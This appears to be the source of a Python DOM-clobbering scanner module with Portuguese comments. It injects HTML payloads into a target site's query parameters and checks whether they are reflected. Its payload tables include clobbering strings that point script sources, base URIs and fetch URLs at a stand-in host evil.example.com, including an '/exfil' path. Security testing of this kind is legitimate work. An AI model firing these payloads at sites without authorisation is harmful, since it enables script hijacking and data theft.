#!/usr/bin/env python3

"""Modulo de deteccao de DOM Clobbering via Named Access.



Testa se uma aplicacao web e vulneravel a DOM Clobbering via:

  - named_access: Elementos HTML com id/name sobrescrevem window.*

  - form_child: Filhos de form sobrescrevem propriedades do form

  - impact: Cadeias de impacto (script.src, form.action, location.href, etc)



Fluxo:

  1. Envia request para a URL alvo (baseline)

  2. Analisa HTML passivamente por pads de clobbering

  3. Injeta payloads via query params e verifica reflexao

  4. Classifica: vulnerable, blocked, error

  5. Retorna resultado consolidado com severidade

"""

import argparse
import logging
import re
from dataclasses import asdict, dataclass
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx

from mytools.core.utils import (
    Cyber,
    add_common_args,
    color,
    create_async_client,
    create_banner,
    fetch,
    print_exploit_info,
    run_main_loop,
    safe_asyncio_run,
    write_output,
)

logger = logging.getLogger("mytools.domclobbering")



_CATEGORY_MAP_DEFAULT: dict[str, list[str]] = {

    "named_access": [

        "window_anchor_id",

        "window_div_id",

        "window_form_name",

        "window_iframe_name",

        "window_embed_name",

        "window_object_name",

        "window_img_name",

        "window_svg_name",

    ],

    "form_child": [

        "form_input_name",

        "form_button_name",

        "form_select_name",

        "form_textarea_name",

        "form_fieldset_name",

        "form_output_name",

    ],

    "impact": [

        "script_src_clobber",

        "form_action_clobber",

        "location_href_clobber",

        "fetch_url_clobber",

        "base_uri_clobber",

        "currentscript_clobber",

    ],

}



_WINDOW_CLOBBERABLE_DEFAULT: frozenset[str] = frozenset({

    "location", "document", "self", "parent", "top", "frames",

    "opener", "name", "status", "length", "closed", "outerHeight",

    "outerWidth", "screenX", "screenY", "innerWidth", "innerHeight",

    "localStorage", "sessionStorage", "console", "chrome",

    "navigation", "visualViewport", "styleMedia",

})



_DOCUMENT_CLOBBERABLE_DEFAULT: frozenset[str] = frozenset({

    "forms", "images", "scripts", "embeds", "plugins", "anchors",

    "links", "all", "cookie", "domain", "URL", "baseURI",

    "referrer", "title", "head", "body", "documentElement",

})



_COMMON_JS_GLOBS_DEFAULT: frozenset[str] = frozenset({

    "config", "settings", "options", "params", "data", "app",

    "module", "exports", "require", "global", "root", "env",

    "debug", "version", "url", "endpoint", "api", "callback",

    "handler", "store", "state", "action", "target", "src",

})



_NAMED_ACCESS_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [

    ("window_anchor_id", '<a id="{name}" href="javascript:void(0)">', "id", ["a", "id="]),

    ("window_div_id", '<div id="{name}"></div>', "id", ["div", "id="]),

    ("window_form_name", '<form name="{name}"></form>', "name", ["form", "name="]),

    ("window_iframe_name", '<iframe name="{name}"></iframe>', "name", ["iframe", "name="]),

    ("window_embed_name", '<embed name="{name}">', "name", ["embed", "name="]),

    ("window_object_name", '<object name="{name}"></object>', "name", ["object", "name="]),

    ("window_img_name", '<img name="{name}" src="x">', "name", ["img", "name="]),

    ("window_svg_name", '<svg name="{name}"></svg>', "name", ["svg", "name="]),

]



_FORM_CHILD_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [

    ("form_input_name", '<form id="{name}"><input name="action" value="javascript:void(0)"></form>', "action", ["input", "name="]),

    ("form_button_name", '<form id="{name}"><button name="action" value="/admin"></button></form>', "action", ["button", "name="]),

    ("form_select_name", '<form id="{name}"><select name="target"><option value="evil"></select></form>', "target", ["select", "name="]),

    ("form_textarea_name", '<form id="{name}"><textarea name="data">payload</textarea></form>', "data", ["textarea", "name="]),

    ("form_fieldset_name", '<form id="{name}"><fieldset name="settings"></fieldset></form>', "settings", ["fieldset", "name="]),

    ("form_output_name", '<form id="{name}"><output name="result">payload</output></form>', "result", ["output", "name="]),

]



_IMPACT_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [

    ("script_src_clobber", '<a id="{name}" href="//evil.example.com/evil.js">', "script.src", ["a", "id=", "href="]),

    ("form_action_clobber", '<form id="{name}"><input name="action" value="https://evil.example.com"></form>', "form.action", ["form", "input", "name="]),

    ("location_href_clobber", '<a id="{name}" href="javascript:alert(1)">', "location.href", ["a", "id=", "href=", "javascript:"]),

    ("fetch_url_clobber", '<a id="{name}" href="//evil.example.com/exfil">', "fetch(url)", ["a", "id=", "href="]),

    ("base_uri_clobber", '<base id="{name}" href="//evil.example.com/">', "document.baseURI", ["base", "id=", "href="]),

    ("currentscript_clobber", '<img name="{name}" src="//evil.example.com/evil.js">', "currentScript.src", ["img", "name=", "src="]),

]




def _load_category_map() -> dict[str, list[str]]:

    from mytools.data import load_payloads

    data = load_payloads("web", "domclobbering", default={"category_map": _CATEGORY_MAP_DEFAULT})

    return data.get("category_map", _CATEGORY_MAP_DEFAULT)



_CATEGORY_MAP = _load_category_map()



def _load_window_clobberable() -> set[str]:

    from mytools.data import load_payloads

    data = load_payloads("web", "domclobbering", default={"window_clobberable": list(_WINDOW_CLOBBERABLE_DEFAULT)})

    return set(data.get("window_clobberable", list(_WINDOW_CLOBBERABLE_DEFAULT)))



_WINDOW_CLOBBERABLE = _load_window_clobberable()



def _load_document_clobberable() -> set[str]:

    from mytools.data import load_payloads

    data = load_payloads("web", "domclobbering", default={"document_clobberable": list(_DOCUMENT_CLOBBERABLE_DEFAULT)})

    return set(data.get("document_clobberable", list(_DOCUMENT_CLOBBERABLE_DEFAULT)))



_DOCUMENT_CLOBBERABLE = _load_document_clobberable()



def _load_common_js_globs() -> set[str]:

    from mytools.data import load_payloads

    data = load_payloads("web", "domclobbering", default={"common_js_globs": list(_COMMON_JS_GLOBS_DEFAULT)})

    return set(data.get("common_js_globs", list(_COMMON_JS_GLOBS_DEFAULT)))



_COMMON_JS_GLOBS = _load_common_js_globs()



def _load_named_access_payloads() -> list[tuple[str, str, str, list[str]]]:

    from mytools.data import load_payloads

    data = load_payloads("web", "domclobbering", default={"named_access_payloads": [list(t) for t in _NAMED_ACCESS_PAYLOADS_DEFAULT]})

    return [tuple(item) for item in data.get("named_access_payloads", [list(t) for t in _NAMED_ACCESS_PAYLOADS_DEFAULT])]



_NAMED_ACCESS_PAYLOADS = _load_named_access_payloads()



def _load_form_child_payloads() -> list[tuple[str, str, str, list[str]]]:

    from mytools.data import load_payloads

    data = load_payloads("web", "domclobbering", default={"form_child_payloads": [list(t) for t in _FORM_CHILD_PAYLOADS_DEFAULT]})

    return [tuple(item) for item in data.get("form_child_payloads", [list(t) for t in _FORM_CHILD_PAYLOADS_DEFAULT])]



_FORM_CHILD_PAYLOADS = _load_form_child_payloads()



def _load_impact_payloads() -> list[tuple[str, str, str, list[str]]]:

    from mytools.data import load_payloads

    data = load_payloads("web", "domclobbering", default={"impact_payloads": [list(t) for t in _IMPACT_PAYLOADS_DEFAULT]})

    return [tuple(item) for item in data.get("impact_payloads", [list(t) for t in _IMPACT_PAYLOADS_DEFAULT])]



_IMPACT_PAYLOADS = _load_impact_payloads()


_RE_ID_NAME = re.compile(

    r"(?:id|name)\s*=\s*[\"']?([a-zA-Z_][a-zA-Z0-9_]*)[\"']?",

    re.IGNORECASE,

)

_RE_CLOBBER_PATTERN = re.compile(

    r"<(\w+)\s+[^>]*(?:id|name)\s*=\s*[\"']?(\w+)[\"']?[^>]*>",

    re.IGNORECASE,

)





@dataclass(frozen=True, slots=True)

class ClobberAttempt:

    """Tentativa individual de DOM Clobbering."""



    technique: str

    category: str

    payload: str

    target_element: str

    attribute_used: str

    method: str

    status_baseline: int

    status_test: int

    size_baseline: int

    size_test: int

    status_changed: bool

    size_changed: bool

    vulnerable: bool

    details: str

    error: str

    exploit: str = ""

    tool: str = ""





@dataclass(frozen=True, slots=True)

class ClobberResult:

    """Resultado consolidado do scan de DOM Clobbering."""



    target: str

    tls: bool

    baseline_status: int

    baseline_size: int

    attempts: list[ClobberAttempt]

    vulnerable_techniques: list[str]

    blocked_techniques: list[str]

    issues: list[str]

    overall_status: str





def _inject_payload(url: str, param: str, payload: str) -> str:

    """Injeta um payload como query parameter na URL."""

    parsed = urlparse(url)

    params = parse_qs(parsed.query)

    params[param] = [payload]

    new_query = urlencode(params, doseq=True)

    return urlunparse(parsed._replace(query=new_query))





def _check_clobber_in_html(html: str, payload: str) -> bool:

    """Verifica se o payload de clobbering esta refletido no HTML."""

    escaped = re.escape(payload)

    return bool(re.search(escaped, html, re.IGNORECASE))





def _detect_passive_clobbering(html: str) -> list[tuple[str, str, str]]:

    """Detecta padroes de DOM Clobbering no HTML (analise passiva).



    Retorna lista de (elemento, attributo, nome_clobberavel).

    """

    findings: list[tuple[str, str, str]] = []

    seen: set[str] = set()



    for match in _RE_CLOBBER_PATTERN.finditer(html):

        tag = match.group(1).lower()

        clob_name = match.group(2).lower()

        attr_type = "id" if f'id="{match.group(2)}"' in match.group(0).lower() or f"id='{match.group(2)}'" in match.group(0).lower() or f"id={match.group(2)}" in match.group(0).lower() else "name"



        key = f"{tag}:{attr_type}:{clob_name}"

        if key in seen:

            continue

        seen.add(key)



        is_window = clob_name in _WINDOW_CLOBBERABLE

        is_doc = clob_name in _DOCUMENT_CLOBBERABLE

        is_js = clob_name in _COMMON_JS_GLOBS



        if is_window or is_doc or is_js:

            if is_window:

                target = f"window.{clob_name}"

            elif is_doc:

                target = f"document.{clob_name}"

            else:

                target = f"window.{clob_name}"

            findings.append((f"<{tag}>", attr_type, target))



    return findings





async def _test_named_access(

    client: httpx.AsyncClient,

    url: str,

    timeout: float,

) -> list[ClobberAttempt]:

    """Testa Named Access DOM Clobbering via injeção de payloads."""

    results: list[ClobberAttempt] = []



    try:

        b_status, _b_headers, _b_body, _b_raw_headers = await fetch(client, url, timeout=timeout)

        b_size = len(_b_body)

    except Exception as e:

        return [ClobberAttempt(

            technique="window_anchor_id", category="named_access",

            payload="", target_element="", attribute_used="", method="GET",

            status_baseline=0, status_test=0, size_baseline=0, size_test=0,

            status_changed=False, size_changed=False, vulnerable=False,

            details="", error=str(e)[:100],

        )]



    for technique, tmpl, attr, indicators in _NAMED_ACCESS_PAYLOADS:  # noqa: B007

        for clob_name in ["config", "settings", "location", "document", "self"]:

            payload = tmpl.format(name=clob_name)

            param = f"_clob_{clob_name}"

            test_url = _inject_payload(url, param, payload)



            try:

                t_status, _t_headers, t_body, _t_raw = await fetch(client, test_url, timeout=timeout)

                t_size = len(t_body)

                reflected = _check_clobber_in_html(t_body.decode(errors="replace"), payload)

                status_changed = t_status != b_status

                size_changed = abs(t_size - b_size) > 50



                vulnerable = reflected or status_changed or size_changed

                details = ""

                if reflected:

                    details = f"Payload refletido no HTML — window.{clob_name} clobberavel"

                elif status_changed:

                    details = f"Status mudou: {b_status} -> {t_status}"

                elif size_changed:

                    details = f"Tamanho mudou: {b_size} -> {t_size}"



                results.append(ClobberAttempt(

                    technique=technique, category="named_access",

                    payload=payload, target_element=f"window.{clob_name}",

                    attribute_used=attr, method="GET",

                    status_baseline=b_status, status_test=t_status,

                    size_baseline=b_size, size_test=t_size,

                    status_changed=status_changed, size_changed=size_changed,

                    vulnerable=vulnerable, details=details, error="",

                ))



                if vulnerable:

                    break



            except Exception as e:

                results.append(ClobberAttempt(

                    technique=technique, category="named_access",

                    payload=payload, target_element=f"window.{clob_name}",

                    attribute_used=attr, method="GET",

                    status_baseline=b_status, status_test=0,

                    size_baseline=b_size, size_test=0,

                    status_changed=False, size_changed=False,

                    vulnerable=False, details="", error=str(e)[:100],

                ))



    return results





async def _test_form_child(

    client: httpx.AsyncClient,

    url: str,

    timeout: float,

) -> list[ClobberAttempt]:

    """Testa Form Child DOM Clobbering via injeção de payloads."""

    results: list[ClobberAttempt] = []



    try:

        b_status, _b_headers, _b_body, _b_raw = await fetch(client, url, timeout=timeout)

        b_size = len(_b_body)

    except Exception as e:

        return [ClobberAttempt(

            technique="form_input_name", category="form_child",

            payload="", target_element="", attribute_used="", method="GET",

            status_baseline=0, status_test=0, size_baseline=0, size_test=0,

            status_changed=False, size_changed=False, vulnerable=False,

            details="", error=str(e)[:100],

        )]



    for technique, tmpl, prop, indicators in _FORM_CHILD_PAYLOADS:

        for clob_name in ["config", "settings", "options"]:

            payload = tmpl.format(name=clob_name)

            param = f"_clob_{clob_name}"

            test_url = _inject_payload(url, param, payload)



            try:

                t_status, _t_headers, t_body, _t_raw = await fetch(client, test_url, timeout=timeout)

                t_size = len(t_body)

                reflected = _check_clobber_in_html(t_body.decode(errors="replace"), payload)

                status_changed = t_status != b_status

                size_changed = abs(t_size - b_size) > 50



                vulnerable = reflected or status_changed or size_changed

                details = ""

                if reflected:

                    details = f"Payload refletido — {clob_name}.{prop} clobberavel"

                elif status_changed:

                    details = f"Status mudou: {b_status} -> {t_status}"

                elif size_changed:

                    details = f"Tamanho mudou: {b_size} -> {t_size}"



                results.append(ClobberAttempt(

                    technique=technique, category="form_child",

                    payload=payload, target_element=f"{clob_name}.{prop}",

                    attribute_used=indicators[1].replace("=", ""), method="GET",

                    status_baseline=b_status, status_test=t_status,

                    size_baseline=b_size, size_test=t_size,

                    status_changed=status_changed, size_changed=size_changed,

                    vulnerable=vulnerable, details=details, error="",

                ))



                if vulnerable:

                    break



            except Exception as e:

                results.append(ClobberAttempt(

                    technique=technique, category="form_child",

                    payload=payload, target_element=f"{clob_name}.{prop}",

                    attribute_used=indicators[1].replace("=", ""), method="GET",

                    status_baseline=b_status, status_test=0,

                    size_baseline=b_size, size_test=0,

                    status_changed=False, size_changed=False,

                    vulnerable=False, details="", error=str(e)[:100],

                ))



    return results





async def _test_impact_chains(

    client: httpx.AsyncClient,

    url: str,

    timeout: float,

) -> list[ClobberAttempt]:

    """Testa cadeias de impacto de DOM Clobbering."""

    results: list[ClobberAttempt] = []



    try:

        b_status, _b_headers, _b_body, _b_raw = await fetch(client, url, timeout=timeout)

        b_size = len(_b_body)

    except Exception as e:

        return [ClobberAttempt(

            technique="script_src_clobber", category="impact",

            payload="", target_element="", attribute_used="", method="GET",

            status_baseline=0, status_test=0, size_baseline=0, size_test=0,

            status_changed=False, size_changed=False, vulnerable=False,

            details="", error=str(e)[:100],

        )]



    for technique, tmpl, sink, indicators in _IMPACT_PAYLOADS:

        for clob_name in ["config", "settings", "app"]:

            payload = tmpl.format(name=clob_name)

            param = f"_clob_{clob_name}"

            test_url = _inject_payload(url, param, payload)



            try:

                t_status, _t_headers, t_body, _t_raw = await fetch(client, test_url, timeout=timeout)

                t_size = len(t_body)

                reflected = _check_clobber_in_html(t_body.decode(errors="replace"), payload)

                status_changed = t_status != b_status

                size_changed = abs(t_size - b_size) > 50



                vulnerable = reflected or status_changed or size_changed

                details = ""

                if reflected:

                    details = f"Payload refletido — {sink} clobberavel via {clob_name}"

                elif status_changed:

                    details = f"Status mudou: {b_status} -> {t_status}"

                elif size_changed:

                    details = f"Tamanho mudou: {b_size} -> {t_size}"



                results.append(ClobberAttempt(

                    technique=technique, category="impact",

                    payload=payload, target_element=sink,

                    attribute_used=indicators[1].replace("=", ""), method="GET",

                    status_baseline=b_status, status_test=t_status,

                    size_baseline=b_size, size_test=t_size,

                    status_changed=status_changed, size_changed=size_changed,

                    vulnerable=vulnerable, details=details, error="",

                ))



                if vulnerable:

                    break



            except Exception as e:

                results.append(ClobberAttempt(

                    technique=technique, category="impact",

                    payload=payload, target_element=sink,

                    attribute_used=indicators[1].replace("=", ""), method="GET",

                    status_baseline=b_status, status_test=0,

                    size_baseline=b_size, size_test=0,

                    status_changed=False, size_changed=False,

                    vulnerable=False, details="", error=str(e)[:100],

                ))



    return results





def print_results(result: ClobberResult) -> None:

    """Exibe os resultados do scan de DOM Clobbering."""

    vuln = [a for a in result.attempts if a.vulnerable]

    blocked = [a for a in result.attempts if not a.vulnerable and not a.error]

    errors = [a for a in result.attempts if a.error]



    print(color("\n--- DOM Clobbering via Named Access ---", Cyber.CYAN, Cyber.BOLD))

    print(color(f"  Alvo:         {result.target}", Cyber.WHITE))

    print(color(f"  TLS:          {'sim' if result.tls else 'nao'}", Cyber.WHITE))

    print(color(f"  Baseline:     {result.baseline_status} ({result.baseline_size} bytes)", Cyber.WHITE))

    print(color(f"  Testes:       {len(result.attempts)}", Cyber.WHITE))

    print(color(f"  Vulneraveis:  {len(vuln)}", Cyber.GREEN if vuln else Cyber.GRAY))

    print(color(f"  Bloqueados:   {len(blocked)}", Cyber.GRAY))

    print(color(f"  Erros:        {len(errors)}", Cyber.RED if errors else Cyber.GRAY))



    if vuln:

        print(color("\n  [!] Vulnerabilidades encontradas:", Cyber.RED))

        seen: set[str] = set()

        for a in vuln:

            key = f"{a.technique}:{a.target_element}"

            if key in seen:

                continue

            seen.add(key)

            print(color(f"    [{a.category}] {a.technique}", Cyber.RED))

            print(color(f"      Alvo: {a.target_element}", Cyber.WHITE))

            print(color(f"      Atributo: {a.attribute_used}", Cyber.WHITE))

            if a.details:

                print(color(f"      Detalhes: {a.details}", Cyber.GRAY))

            print_exploit_info(a.exploit, a.tool)

        print(color(f"\n  Total: {len(vuln)} vulneraveis de {len(result.attempts)} testes", Cyber.WHITE))

    else:

        print(color("\n  [+] Nenhuma vulnerabilidade de DOM Clobbering detectada", Cyber.GREEN))



    if result.issues:

        print(color("\n  [!] Observacoes:", Cyber.YELLOW))

        for issue in result.issues:

            print(color(f"    - {issue}", Cyber.YELLOW))





async def run_scan(

    target: str,

    categories: list[str],

    timeout: float,

    output_file: str | None,

) -> int:

    """Executa o scan de DOM Clobbering."""

    logger.info("DOM Clobbering scan para %s", target)

    tls = target.startswith("https://")



    async with create_async_client(timeout=timeout) as client:

        try:

            b_status, _b_headers, b_body, _b_raw = await fetch(client, target, timeout=timeout)

            b_size = len(b_body)

        except Exception as e:

            print(color(f"Erro ao acessar {target}: {e}", Cyber.RED))

            return 1



        passive_findings = _detect_passive_clobbering(b_body.decode(errors="replace"))



        all_attempts: list[ClobberAttempt] = []

        test_categories = categories if categories else list(_CATEGORY_MAP.keys())



        for cat in test_categories:

            if cat == "named_access":

                all_attempts.extend(await _test_named_access(client, target, timeout))

            elif cat == "form_child":

                all_attempts.extend(await _test_form_child(client, target, timeout))

            elif cat == "impact":

                all_attempts.extend(await _test_impact_chains(client, target, timeout))



        if passive_findings:

            for element, attr, target_name in passive_findings:

                all_attempts.append(ClobberAttempt(

                    technique="passive_clobber_detected", category="named_access",

                    payload=element, target_element=target_name,

                    attribute_used=attr, method="PASSIVE",

                    status_baseline=b_status, status_test=b_status,

                    size_baseline=b_size, size_test=b_size,

                    status_changed=False, size_changed=False,

                    vulnerable=True,

                    details=f"Elemento {element} com {attr}={target_name.split('.')[-1]} detectado passivamente",

                    error="",

                    exploit="<a name='x' id='x'><a id='x' name='x'>",

                    tool="XSStrike",

                ))



        vuln_techs = list({a.technique for a in all_attempts if a.vulnerable})

        blocked_techs = list({a.technique for a in all_attempts if not a.vulnerable and not a.error})

        issues: list[str] = []



        if not all_attempts:

            issues.append("Nenhum teste de DOM Clobbering executado")

        if passive_findings:

            issues.append(f"{len(passive_findings)} padroes de clobbering detectados passivamente")



        result = ClobberResult(

            target=target, tls=tls,

            baseline_status=b_status, baseline_size=b_size,

            attempts=all_attempts,

            vulnerable_techniques=vuln_techs,

            blocked_techniques=blocked_techs,

            issues=issues,

            overall_status="vulnerable" if vuln_techs else ("safe" if blocked_techs else "unknown"),

        )



        print_results(result)

        logger.info(

            "DOM Clobbering scan concluido: %d testes, %d vulneraveis",

            len(all_attempts), len(vuln_techs),

        )



        if output_file:

            write_output(output_file, asdict(result))

            logger.info("Resultados salvos em %s", output_file)



        return 1 if vuln_techs else 0





def banner_art() -> None:

    """Exibe a banner do modulo."""

    art = r"""

    ____                              __  ____

   / ___/_   __  __ __  __   ____   /  |/  (_) ____

  / /   | | / / / / / / /  / __/  / /|_/ / / /_  /

 / /___ | |/ / / / / / /  / /_   / /  / / / __/ /

/____/ |___/\_,_/_/_/_/  /___/  /_/  /_/_/_/ /_/

"""

    create_banner(art, "   domclobbering: named_access, form_child, impact")()





def build_parser() -> argparse.ArgumentParser:

    """Construtor do parser de argumentos."""

    parser = argparse.ArgumentParser(

        prog="mytools-domclob",

        description="DOM Clobbering — detecta named access clobbering em paginas web.",

        formatter_class=argparse.RawDescriptionHelpFormatter,

        epilog=(

            "Exemplos:\n"

            "  mytools-domclob https://target.com\n"

            "  mytools-domclob https://target.com -c named_access\n"

            "  mytools-domclob https://target.com -c form_child\n"

            "  mytools-domclob https://target.com -c impact\n"

            "  mytools-domclob https://target.com --proxy http://127.0.0.1:8080"

        ),

    )

    parser.add_argument("url", help="URL alvo para o scan")

    parser.add_argument(

        "-c", "--category",

        default="all",

        choices=["all", "named_access", "form_child", "impact"],

        help="Categoria de testes (default: todas)",

    )

    add_common_args(parser)

    return parser





def run_once(args: argparse.Namespace) -> int:

    """Executa um scan DOM Clobbering a partir de argumentos parseados."""

    logger.info("DOM Clobbering scan iniciado para %s", args.url)

    categories: list[str] = []

    if getattr(args, "category", None) and args.category != "all":

        categories = [args.category]

    return safe_asyncio_run(

        run_scan(

            target=args.url,

            categories=categories,

            timeout=getattr(args, "timeout", 10),

            output_file=getattr(args, "output", None),

        ),

    )





def main() -> int:

    """Entry point do modulo DOM Clobbering."""

    return run_main_loop(

        parser=build_parser(),

        banner_fn=banner_art,

        run_fn=run_once,

        has_target=lambda a: bool(getattr(a, "url", None) or getattr(a, "target", None)),

        prompt="domclob> ",

        description="DOM Clobbering interativo.",

        example="https://target.com -c named_access",

        contextual_help=(

            "Uso: <url> [opcoes]\n"

            "Exemplos:\n"

            "  https://target.com\n"

            "  https://target.com -c named_access\n"

            "  https://target.com -c form_child\n"

            "  https://target.com -c impact\n"

            "  https://target.com --proxy http://127.0.0.1:8080"

        ),

    )

